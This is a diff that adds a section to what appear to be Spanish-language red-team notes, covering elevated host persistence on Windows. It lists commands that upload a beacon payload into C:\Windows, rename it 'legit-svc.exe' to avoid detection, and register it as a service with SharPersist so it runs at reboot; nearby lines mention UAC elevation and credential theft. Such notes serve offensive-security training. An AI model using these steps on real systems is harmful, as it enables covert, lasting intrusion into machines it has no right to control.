@@ -163,6 +163,25 @@ copy "tcp-local_x64.svc.exe" "Service 3.exe"
 ```
 elevate uac-schtasks tcp-local
 ```
+# Elevated Host Persistence
+## Windows Services
+Ir a un directorio con permisos de escritura
+```
+cd C:\Windows
+```
+Subir un payload
+```
+upload C:\Payloads\tcp-local_x64.svc.exe
+```
+Cambiar el nombre evitar el rastro
+```
+mv tcp-local_x64.svc.exe legit-svc.exe
+```
+Añadir el servicio para que se ejecute cuando el equipo se reinicie
+```
+execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+```
+
 # Credential Theft
 
 ## Kerberos Tickets
